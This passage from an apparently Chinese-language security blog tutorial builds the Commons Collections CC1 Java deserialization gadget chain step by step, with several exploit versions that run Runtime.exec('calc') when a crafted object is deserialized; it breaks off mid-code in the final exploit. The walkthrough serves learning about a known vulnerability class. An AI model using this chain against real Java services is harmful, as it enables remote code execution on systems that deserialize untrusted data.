class="hljs-keyword">for</span> (Map.Entry entry:decorateMap.entrySet())&#123;  <br>            entry.setValue(runtime);  <br> &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>decorateMap.entrySet()</code> 返回<code>decorateMap</code>中的所有键值对的集合。</li><li><code>Map.Entry</code> 是一个表示Map中的键值对的接口。</li><li><code>entry.setValue(runtime)</code> 将每个键值对的值设置为<code>runtime</code>的值。</li></ul><p>其实比较关键的代码是这两部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">hashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);  <span class="hljs-comment">//这里先往Map里面放些值</span><br><span class="hljs-keyword">for</span> (Map.Entry entry:decorateMap.entrySet())&#123;  <br>           entry.setValue(runtime);  <br>&#125;  <span class="hljs-comment">//遍历Map调用setValue方法，注意runtime这个参数：</span><br><span class="hljs-comment">//说白了还是在之前的基础上调用checksetValue(runtime)！</span><br></code></pre></td></tr></table></figure><p>所以现在目标就是找<code>readObject()</code> 里面调用了 <code>setValue()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//AnnotationInvocationHandler.java的readObject方法存在：</span><br><span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br></code></pre></td></tr></table></figure><p>这里拿了DB师傅的图：</p><p><img src="/img/cc1.png" alt="cc1"></p><p>那么现在我们的目的是要调用这个类下的<code>readObject</code>方法，但注意：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>, Serializable<br></code></pre></td></tr></table></figure><p><code>Java</code>中，如果没有明确指定权限修饰符，则默认使用的是<code>default</code>修饰符。使用<code>default</code>修饰符修饰的类和成员变量等只能在同一个包中被访问，而不能在其他包中被访问。所以得通过反射调用这东西。</p><p>然后注意传参：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues)<br><span class="hljs-comment">//第一个放个注解类型，第二个放的是我们要遍历的transformedMap</span><br></code></pre></td></tr></table></figure><p>注解的话比如<code>@override</code>，<code>@Target</code>这种</p><p>理想情况下的EXP:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// 理想情况的 EXP</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformMapImagineEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> hashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);  <br> Map&lt;Object, Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, invokerTransformer);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> aihConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, decorateMap);  <br>  <br> <span class="hljs-comment">// 序列化反序列化  </span><br> <span class="hljs-comment">//serialize(o);  </span><br> <span class="hljs-comment">//unserialize(&quot;ser.bin&quot;);  </span><br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其实思路就是通过反射调用<code>AnnotationInvocationHandler</code>的构造函数(实例化一个)然后序列化反序列化触发重写的<code>readObject</code>方法进而调用上面说的<code>setValue</code>方法。</p><p>这段代码肯定是没结果的，需要解决一些问题：</p><p>1.<code>Runtime</code>对象不可序列化(没有<code>implements Serializable</code>)</p><p><img src="/img/CC102.png" alt="CC102"></p><p>这东西很好解决：Class对象是可以序列化的，先写一段利用反射实现弹计算器的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> FinalEXP;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SolvedProblemRuntime</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);  <br> <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> (Runtime) method.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);  <br> run.invoke(runtime, <span class="hljs-string">&quot;calc&quot;</span>);  <br> &#125;  <br>&#125;<br><span class="hljs-comment">//注意getRuntime方法是静态方法</span><br></code></pre></td></tr></table></figure><p>将这个反射的 <code>Runtime</code> 改造为使用 <code>InvokerTransformer.transform()</code> 调用的方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SolvedProblemRuntime</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;   <br>        <br> <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br>        <span class="hljs-comment">//Class runtime = Runtime.class;</span><br>        <span class="hljs-comment">//相当于：Method m1 = runtime.getDeclaredMethod(&quot;getRuntime&quot;);，其实就是通过反射拿到了getruntime方法。</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;).transform(getRuntimeMethod);<br>        <span class="hljs-comment">//相当于：Runtime run1 = (Runtime)m1.invoke(null,null);runtime是个静态方法两个参数置空就行。其实就是获得了一个runtime的实例。</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br>        <span class="hljs-comment">//相当于下面这个东西：</span><br>        <span class="hljs-comment">//        Method m2 = runtime.getDeclaredMethod(&quot;exec&quot;, String.class);</span><br>        <span class="hljs-comment">//        m2.invoke(run1,&quot;calc&quot;);</span><br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>这里发现每个<code>transform()</code>方法的参数都是上一个结果，这时可以利用<code>ChainedTransformer</code>类下的<code>transform</code>方法进行简写。我们看下这个东西：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iTransformers = transformers;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>            object = iTransformers[i].transform(object);<br>        &#125;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br><span class="hljs-comment">//放个Transformer数组，然后调用对应transform方法</span><br></code></pre></td></tr></table></figure><p>现在怎么把这个<code>ChainedTransformer</code>套进去就很清晰了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChainedTransformerEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> chainedTransformer.transform(Runtime.class);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>注意最后的<code>chainedTransformer.transform(Runtime.class)</code>，可以发现一个问题：这里又出现最初的<code>transform</code>方法调用了。所以现在把<code>decorate</code>后面那些给它拼上去：即通过<code>AnnotationInvocationHandler</code>下重写的<code>readObject</code>方法调用<code>transform</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChainedTransformerEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> hashMap.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);  <br> Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> aihConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, transformedMap);  <br>  <br> <span class="hljs-comment">// 序列化反序列化  </span><br> serialize(o);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>但这时并不会弹计算器，因为前面也说了想进到<code>setValue</code>方法得满足两个条件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) <br>            &#125;<br></code></pre></td></tr></table></figure><p>memeberType是获取注解中成员变量的名称，然后并且检查键值对中键名是否有对应的名称，而我们所使用的注解是没有成员变量的。</p><p>我们先看看第一个<code>memberType</code>是什么意思：</p><p><img src="/img/cc103.png" alt="cc103"></p><p>我们传入的参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, decorateMap);  <br></code></pre></td></tr></table></figure><p>这个注解得有成员变量(即成员的类型不能为空：<code>memberType != null</code>)。看看<code>@override</code>里面是否又成员变量：</p><p><img src="/img/cc104.png" alt="cc104"></p><p>可以看到这是个空的，不过好在<code>@Target</code>里面有个<code>value</code></p><p><img src="/img/cc105.png" alt="cc105"></p><p>现在第一个<code>if</code>解决了，再看第二个<code>if</code>：要求 <code>hashMap.put(&quot;para1&quot;, &quot;para2&quot;)</code> 中的 <code>para1</code> 与成员变量相对应。这里直接放前面的<code>value</code>就行。</p><p>这里直接放DB师傅的图：</p><p><img src="/img/cc106.png" alt="cc106"></p><p>最后一个问题就是这里<code>setValue</code>的参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">memberValue.setValue(<br>                       <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                           value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                               annotationType.members().get(name)));<br></code></pre></td></tr></table></figure><p>可以看到这个参数并不是我们想要的<code>Runtime.class</code>，不过<code>ConstantTransformer</code>类的存在可以帮我们解决这个问题：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ConstantTransformer.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iConstant = constantToReturn;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">return</span> iConstant;<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以看到这东西的<code>transform</code>方法：不管input什么他都只能返回<code>iConstant</code>，而<code>iConstant</code>这东西可以在构造函数中定义。那么我们可以<code>new</code>一个<code>ConstantTransformer(Runtime.class)</code>，这时调用它的<code>transform</code>方法时不管input什么都只能返回<code>Runtime.class</code>。</p><p>最终EXP(参考了DB师傅的)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> FinalEXP;  <br>  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.annotation.Target;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// 最终的 EXPpublic class TransformMapEXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// 构造 setValue 的可控参数  </span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,  <br> 